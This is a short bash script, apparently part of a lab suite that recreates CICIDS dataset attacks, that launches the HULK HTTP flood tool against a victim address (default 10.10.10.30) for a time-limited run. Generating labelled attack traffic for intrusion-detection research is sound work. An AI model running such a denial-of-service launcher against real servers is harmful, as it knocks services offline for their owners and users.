#!/usr/bin/env bash
# 10 DoS Hulk — HTTP unique-request sel (CICIDS: DoS Hulk). Sınırlı (timeout).
set -uo pipefail
VIC="${1:-10.10.10.30}"; DUR="${2:-20}"
echo "[dos-hulk] HULK http://$VIC/ (${DUR}s)"
HK=""
for p in /opt/hulk/hulk.py "$HOME/hulk/hulk.py" /usr/share/hulk/hulk.py; do
  [ -f "$p" ] && HK="$p" && break
done
if [ -n "$HK" ]; then
  timeout "$DUR" python3 "$HK" "http://$VIC/" 2>&1 | tail -3 || true
else
  echo "[dos-hulk] hulk.py yok → atlandı"
fi
echo "[dos-hulk] done"
